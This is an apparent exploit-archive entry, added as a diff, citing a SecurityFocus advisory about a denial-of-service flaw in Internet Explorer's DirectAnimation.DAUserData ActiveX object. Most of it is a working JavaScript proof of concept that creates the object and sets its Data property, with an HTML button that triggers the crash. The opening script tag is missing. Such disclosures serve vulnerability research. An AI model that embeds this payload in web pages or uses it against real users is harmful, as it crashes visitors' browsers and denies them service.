@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/18902/info
+
+Microsoft Internet Explorer is prone to a denial-of-service vulnerability.
+
+This issue is triggered when an attacker convinces a victim user to visit a malicious website that uses the 'DirectAnimation.DAUserData' object in a malicious manner.
+
+Remote attackers may exploit this issue to crash Internet Explorer, effectively denying service to legitimate users.
+
+// MoBB Demonstration
+function Demo() {
+	var a = new ActiveXObject('DirectAnimation.DAUserData');
+	a.Data = 'Hello';
+}
+
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type='button' onClick='Demo()' value='Start Demo!'>
